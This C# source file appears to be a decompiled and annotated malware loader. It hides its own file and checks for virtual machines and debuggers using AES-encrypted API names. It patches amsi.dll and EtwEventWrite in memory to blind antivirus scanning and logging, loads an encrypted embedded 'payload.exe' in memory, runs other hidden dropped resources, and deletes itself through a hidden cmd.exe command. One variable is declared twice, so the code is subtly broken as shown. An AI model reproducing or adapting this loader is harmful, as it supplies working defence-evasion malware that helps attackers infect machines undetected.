using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace namespace_1
{
	internal class class_1
	{
		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetProcAddress(IntPtr kernel32_hmodule, string procName);

		private static void Main(string[] args)
		{	

			/* Get current process filename */
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			File.SetAttributes(fileName, FileAttributes.Hidden | FileAttributes.System);

			
			/* Check if in virtual machine */
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				string text = managementBaseObject["Manufacturer"].ToString().ToLower();
				if (
					(text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || 
					 text.Contains("vmware") || 
					 managementBaseObject["Model"].ToString() == "VirtualBox")
				{
					Console.WriteLine("Detected Virutal machine");
				}
			}
			managementObjectSearcher.Dispose();


			/* Check debugger */
			IntPtr kernel32_hmodule = class_1.LoadLibrary("kernel32.dll");
			IntPtr CheckRemoteDebuggerPresent_funcPtr = class_1.GetProcAddress(kernel32_hmodule,  // CheckRemoteDebuggerPresent
				Encoding.UTF8.GetString(class_1.aes_decryptor_func(
					Convert.FromBase64String("Ok++WI0tak7DdF3uV9x+8O7wJaTIlfxMVTMno9KXut4="), 
					Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
					Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg=="))));

			IntPtr IsDebuggerPresent_funcPtr = class_1.GetProcAddress(kernel32_hmodule, // IsDebuggerPresent
				Encoding.UTF8.GetString(class_1.aes_decryptor_func(
					Convert.FromBase64String("amZLVSQJiUQKj6Rv/kTQ8kyn+kGd0mUv6VK0wS/w3/E="), 
					Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
					Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg=="))));

			class_1.CheckRemoteDebuggerPresent_func check_debugger1 = (class_1.CheckRemoteDebuggerPresent_func)Marshal.GetDelegateForFunctionPointer(CheckRemoteDebuggerPresent_funcPtr, typeof(class_1.CheckRemoteDebuggerPresent_func));
			class_1.seeminglyBlank_func check_debugger2 = (class_1.seeminglyBlank_func)Marshal.GetDelegateForFunctionPointer(IsDebuggerPresent_funcPtr, typeof(class_1.seeminglyBlank_func));
			bool flag = false;

			check_debugger1(Process.GetCurrentProcess().Handle, ref flag);
			if (Debugger.IsAttached || flag || check_debugger2())
			{
				Console.WriteLine("Detected debugger");
			}


			IntPtr VirtualProtect_funcPtr = class_1.GetProcAddress(kernel32_hmodule, "VirtualProtect");
			class_1.VirtualProtect_func virtProtect_func = (class_1.VirtualProtect_func) Marshal.GetDelegateForFunctionPointer(VirtualProtect_funcPtr, typeof(class_1.VirtualProtect_func));
			
            IntPtr amsi_hmodule = class_1.LoadLibrary("amsi.dll");
			IntPtr IsDebuggerPresent_funcPtr = class_1.GetProcAddress(amsi_hmodule,  // IsDebuggerPresent
                Encoding.UTF8.GetString(class_1.aes_decryptor_func(
                    Convert.FromBase64String("WG/Dged0cIrjNUQv5M9ONw=="), 
                    Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
                    Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg=="))));


			byte[] array;
			if (IntPtr.Size == 8)
			{
				array = new byte[] {184, 87, 0, 7, 128, 195};
			}
			else
			{
				array = new byte[] {184, 87, 0, 7, 128, 194, 24, 0};
			}

			uint flNewProtect;
			virtProtect_func(IsDebuggerPresent_funcPtr, (UIntPtr)((ulong)((long)array.Length)), 64U, out flNewProtect);
			Marshal.Copy(array, 0, IsDebuggerPresent_funcPtr, array.Length);
			virtProtect_func(IsDebuggerPresent_funcPtr, (UIntPtr)((ulong)((long)array.Length)), flNewProtect, out flNewProtect);

			IntPtr ntdll_hmodule = class_1.LoadLibrary("ntdll.dll");
			IntPtr EtwEventWrite_funcPtr = class_1.GetProcAddress(ntdll_hmodule,  // EtwEventWrite
                Encoding.UTF8.GetString(class_1.aes_decryptor_func( 
                    Convert.FromBase64String("KMgwS70BP93VTwRv09KJTQ=="), 
                    Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
                    Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg=="))));


			if (IntPtr.Size == 8) {
				array = new byte[]{195};
			} else {
				byte[] array2 = new byte[3];
				array2[0] = 194;
				array2[1] = 20;
				array = array2;
			}
			
			virtProtect_func(EtwEventWrite_funcPtr, (UIntPtr)((ulong)((long)array.Length)), 64U, out flNewProtect);
			Marshal.Copy(array, 0, EtwEventWrite_funcPtr, array.Length);
			virtProtect_func(EtwEventWrite_funcPtr, (UIntPtr)((ulong)((long)array.Length)), flNewProtect, out flNewProtect);


			string payload_exe_string = Encoding.UTF8.GetString(  //  payload.exe
                class_1.aes_decryptor_func(
                    Convert.FromBase64String("ZoHIhlSGD8rN6cc5D8M/MA=="), 
                    Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
                    Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg==")));

			string runpe_dll_string = Encoding.UTF8.GetString(   //  runpe.dll
                class_1.aes_decryptor_func(
                    Convert.FromBase64String("shwnMnkYp+bePn1r9fIgQg=="), 
                    Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
                    Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg==")));

			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
			for (int i = 0; i < manifestResourceNames.Length; i++)
			{
				string name = manifestResourceNames[i];
				if (!(name == payload_exe_string) && !(name == runpe_dll_string))
				{
					File.WriteAllBytes(name, class_1.loadManifestResourceStream_func(name));
					File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
					new Thread(delegate() {
						Process.Start(name).WaitForExit();
						File.SetAttributes(name, FileAttributes.Normal);
						File.Delete(name);
					}).Start();
				}
			}

			byte[] rawAssembly = class_1.ungzip_stream_func(
                class_1.aes_decryptor_func(
                    class_1.loadManifestResourceStream_func(payload_exe_string), 
                    Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
                    Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg==")));
			
            string[] array3 = new string[0];
			
			try {
				array3 = args[0].Split(new char[] {' '});
			} catch {}

			MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
			
			try {
				entryPoint.Invoke(null, new object[] {array3});
			} catch {
				entryPoint.Invoke(null, null);
			}

			string string3 = Encoding.UTF8.GetString(   //  /c choice /c y /n /d y /t 1 & attrib -h -s "
                class_1.aes_decryptor_func(
                    Convert.FromBase64String("tMNbxejM5jxzm3r5TKG6sPhlK6QF/D8w6/aOC8lz9bfMr26dy72cAJCSoDcBoN3Q"), 
                    Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
                    Convert.FromBase64String("WTltvoM17r/Ehimm8ynucg==")));

			Process.Start(new ProcessStartInfo
			{
				Arguments = string.Concat(new string[]
				{
					string3,
					fileName,
					"\" & del \"",
					fileName,
					"\""
				}),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002620 File Offset: 0x00000820
		private static byte[] aes_decryptor_func(byte[] input, byte[] key, byte[] iv)
		{
			AesManaged aesManaged = new AesManaged();
			aesManaged.Mode = CipherMode.CBC;
			aesManaged.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor(key, iv);
			byte[] result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			cryptoTransform.Dispose();
			aesManaged.Dispose();
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002664 File Offset: 0x00000864
		private static byte[] ungzip_stream_func(byte[] bytes)
		{
			MemoryStream memoryStream = new MemoryStream(bytes);
			MemoryStream memoryStream2 = new MemoryStream();
			GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			gzipStream.CopyTo(memoryStream2);
			gzipStream.Dispose();
			memoryStream2.Dispose();
			memoryStream.Dispose();
			return memoryStream2.ToArray();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000026A8 File Offset: 0x000008A8
		private static byte[] loadManifestResourceStream_func(string name)
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			MemoryStream memoryStream = new MemoryStream();
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);	
			manifestResourceStream.CopyTo(memoryStream);
			manifestResourceStream.Dispose();
			byte[] result = memoryStream.ToArray();
			memoryStream.Dispose();
			return result;
		}

		// Token: 0x02000003 RID: 3
		// (Invoke) Token: 0x06000009 RID: 9
		private delegate bool VirtualProtect_func(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		// Token: 0x02000004 RID: 4
		// (Invoke) Token: 0x0600000D RID: 13
		private delegate bool CheckRemoteDebuggerPresent_func(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x02000005 RID: 5
		// (Invoke) Token: 0x06000011 RID: 17
		private delegate bool seeminglyBlank_func();
	}
}
